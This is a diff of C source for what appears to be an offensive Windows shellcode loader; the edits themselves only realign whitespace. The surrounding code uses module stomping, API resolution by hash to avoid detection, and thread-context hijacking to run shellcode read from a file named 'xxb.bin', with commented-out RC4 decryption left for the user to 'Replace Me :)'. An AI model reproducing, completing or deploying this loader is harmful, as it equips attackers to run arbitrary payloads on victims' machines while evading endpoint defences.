@@ -42,9 +42,9 @@ _CleanUp:
 void RunPayload(PBYTE pbStompAddr, PBYTE pbShellcode, DWORD dwShellcodeSize)
 {
 	PVOID		pvStompAddr		= pbStompAddr;
-	SIZE_T		stShellCodeSize	= dwShellcodeSize;
-	ULONG		ulNewProtection = PAGE_READWRITE;
-	ULONG		ulOldProtection = 0;
+	SIZE_T		stShellCodeSize		= dwShellcodeSize;
+	ULONG		ulNewProtection 	= PAGE_READWRITE;
+	ULONG		ulOldProtection 	= 0;
 	NTSTATUS	ntStatus		= 0;
 	HANDLE		hThread			= NULL;
 	CONTEXT     ctx				= { 0 };
@@ -71,7 +71,7 @@ void RunPayload(PBYTE pbStompAddr, PBYTE pbShellcode, DWORD dwShellcodeSize)
 		ctx.ContextFlags = CONTEXT_FULL;
 
 		if (win32Api.pfnNtSetContextThread(hThread, &ctx))	__fastfail(0xc00000022);
-		if (win32Api.pfnNtResumeThread(hThread, 0))			__fastfail(0xc00000022);
+		if (win32Api.pfnNtResumeThread(hThread, 0))		__fastfail(0xc00000022);
 	}
 	
 	win32Api.pfnNtWaitForSingleObject(hThread, FALSE , NULL);
@@ -80,14 +80,14 @@ void RunPayload(PBYTE pbStompAddr, PBYTE pbShellcode, DWORD dwShellcodeSize)
 BOOL ModuleStomping(PBYTE* pbStompAddr)
 {
 	UNICODE_STRING		usDllPath		= {0};
-	NTSTATUS			ntStatus		= 0;
-	HANDLE				hStomp			= NULL;
-	ULONG				ulFlags			= 0x2;// Dont Resolve DllMain && Dont Resolve Reference
-	BOOL				bRet			= FALSE;
-	PPEB			    pBeb			= (PPEB)__readgsqword(0x60);
-	PPEB_LDR_DATA	    pPebLdrData		= pBeb->Ldr;
-	PLIST_ENTRY		    pListHeadNode	= &pPebLdrData->InMemoryOrderModuleList;
-	PLIST_ENTRY		    pCurrentNode	= pListHeadNode->Flink;
+	NTSTATUS		ntStatus		= 0;
+	HANDLE			hStomp			= NULL;
+	ULONG			ulFlags			= 0x2;// Dont Resolve DllMain && Dont Resolve Reference
+	BOOL			bRet			= FALSE;
+	PPEB			pBeb			= (PPEB)__readgsqword(0x60);
+	PPEB_LDR_DATA	        pPebLdrData		= pBeb->Ldr;
+	PLIST_ENTRY		pListHeadNode		= &pPebLdrData->InMemoryOrderModuleList;
+	PLIST_ENTRY		pCurrentNode		= pListHeadNode->Flink;
 
 	_RtlInitUnicodeString(&usDllPath, TARGETDLL);
 
@@ -141,22 +141,22 @@ BOOL InitApi()
 	if (!GetImageBaseByStack(&ulKernel32, &ulNtdll))
 		goto _CleanUp;
 
-	win32Api.pfnSleep					    = (evaSleep)GetProcAddressByHash(ulKernel32, SLEEPHASH);
+	win32Api.pfnSleep					= (evaSleep)GetProcAddressByHash(ulKernel32, SLEEPHASH);
 	win32Api.pfnLdrLoadDll					= (evaLdrLoadDll)GetProcAddressByHash(ulNtdll, LDRLOADDLLHASH);
-	win32Api.pfnNtProtectVirtualMemory		= (evaNtProtectVirtualMemory)GetProcAddressByHash(ulNtdll, NTPROTECTVIRTUALMEMORYHASH);
-	win32Api.pfnNtCreateThreadEx			= (evaNtCreateThreadEx)GetProcAddressByHash(ulNtdll, NTCREATETHREADEXHASH);
+	win32Api.pfnNtProtectVirtualMemory			= (evaNtProtectVirtualMemory)GetProcAddressByHash(ulNtdll, NTPROTECTVIRTUALMEMORYHASH);
+	win32Api.pfnNtCreateThreadEx				= (evaNtCreateThreadEx)GetProcAddressByHash(ulNtdll, NTCREATETHREADEXHASH);
 	win32Api.pfnNtResumeThread				= (evaNtResumeThread)GetProcAddressByHash(ulNtdll, NTRESUMETHREADHASH);
-	win32Api.pfnNtGetContextThread			= (evaNtGetContextThread)GetProcAddressByHash(ulNtdll, NTGETCONTEXTTHREADHASH);
-	win32Api.pfnNtSetContextThread			= (evaNtSetContextThread)GetProcAddressByHash(ulNtdll, NTSETCONTEXTTHREADHASH);
-	win32Api.pfnGetModuleHandleW			= (evaGetModuleHandleW)GetProcAddressByHash(ulKernel32, GETMODULEHANDLEWHASH);
-	win32Api.pfnCreateFileMappingW			= (evaCreateFileMappingW)GetProcAddressByHash(ulKernel32, CREATEFILEMAPPINGWHASH);
+	win32Api.pfnNtGetContextThread				= (evaNtGetContextThread)GetProcAddressByHash(ulNtdll, NTGETCONTEXTTHREADHASH);
+	win32Api.pfnNtSetContextThread				= (evaNtSetContextThread)GetProcAddressByHash(ulNtdll, NTSETCONTEXTTHREADHASH);
+	win32Api.pfnGetModuleHandleW				= (evaGetModuleHandleW)GetProcAddressByHash(ulKernel32, GETMODULEHANDLEWHASH);
+	win32Api.pfnCreateFileMappingW				= (evaCreateFileMappingW)GetProcAddressByHash(ulKernel32, CREATEFILEMAPPINGWHASH);
 	win32Api.pfnMapViewOfFile				= (evaMapViewOfFile)GetProcAddressByHash(ulKernel32, MAPVIEWOFFILEWHASH);
 	win32Api.pfnUnmapViewOfFile				= (evaUnmapViewOfFile)GetProcAddressByHash(ulKernel32, UNMAPVIEWOFFILEWHASH);
 	win32Api.pfnCloseHandle					= (evaCloseHandle)GetProcAddressByHash(ulKernel32,CLOSEHANDLEHASH);
 	win32Api.pfnReadFile					= (evaReadFile)GetProcAddressByHash(ulKernel32,READFILEHASH);
 	win32Api.pfnCreateFileW					= (evaCreateFileW)GetProcAddressByHash(ulKernel32,CREATEFILEWHASH);
 	win32Api.pfnGetFileSize					= (evaGetFileSize)GetProcAddressByHash(ulKernel32,GETFILESIZEHASH);
-	win32Api.pfnNtWaitForSingleObject		= (evaNtWaitForSingleObject)GetProcAddressByHash(ulNtdll, NTWAITFORSINGLEOBJECTHASH);
+	win32Api.pfnNtWaitForSingleObject			= (evaNtWaitForSingleObject)GetProcAddressByHash(ulNtdll, NTWAITFORSINGLEOBJECTHASH);
 	win32Api.ulTpReleaseCleanupGroupMembers = (ULONG_PTR)GetProcAddressByHash(ulNtdll, TPRELEASECLEANUPGROUPMEMBERSHASH);
 
 	if (win32Api.pfnCloseHandle && win32Api.pfnReadFile && win32Api.pfnCreateFileW && win32Api.pfnGetFileSize &&
@@ -172,15 +172,15 @@ _CleanUp:
 
 BOOL ReadPayLoad(PBYTE* pbShellcode, PDWORD pdwShellcodeSize)
 {
-	BOOL        bRet							= FALSE;
-	HANDLE		hFile							= INVALID_HANDLE_VALUE;
-	DWORD		dwFileSize						= 0;
-	PVOID		pvShellcodeBuffer				= NULL;
-	DWORD		dwNumberOfBytesRead				= 0;
+	BOOL        bRet					= FALSE;
+	HANDLE		hFile					= INVALID_HANDLE_VALUE;
+	DWORD		dwFileSize				= 0;
+	PVOID		pvShellcodeBuffer			= NULL;
+	DWORD		dwNumberOfBytesRead			= 0;
 	wchar_t*	pszCurrentLastBackSlashPath		= NULL;
-	wchar_t		szShellCodeName[20]				= L"xxb.bin"; // Replace Me :)
+	wchar_t		szShellCodeName[20]			= L"xxb.bin"; // Replace Me :)
 	wchar_t		szShellCodePath[MAX_PATH]		= { 0 };
-	wchar_t		szCurrentDirectory[MAX_PATH]	= { 0 };
+	wchar_t		szCurrentDirectory[MAX_PATH]		= { 0 };
 	
 	GetModuleFileNameW(NULL, szCurrentDirectory, MAX_PATH);
 
@@ -216,7 +216,7 @@ BOOL ReadPayLoad(PBYTE* pbShellcode, PDWORD pdwShellcodeSize)
 
 	// Decrypt? ReplaceMe :)
 	//unsigned char	s[256] = { 0x29 ,0x23 ,0xBE ,0x84 ,0xE1 ,0x6C ,0xD6 ,0xAE ,0x00 };
-	//char			key[256] = { 0x79 ,0x63 ,0x62 ,0x74 ,0x64 ,0x76 ,0x61 ,0x64 ,0x61 ,0x65 ,0x00 };
+	//char	key[256] = { 0x79 ,0x63 ,0x62 ,0x74 ,0x64 ,0x76 ,0x61 ,0x64 ,0x61 ,0x65 ,0x00 };
 	//
 	//RC4Init(s, key, (unsigned long)strlen(key));
 	//RC4Crypt(s, pvShellcodeBuffer, dwFileSize);
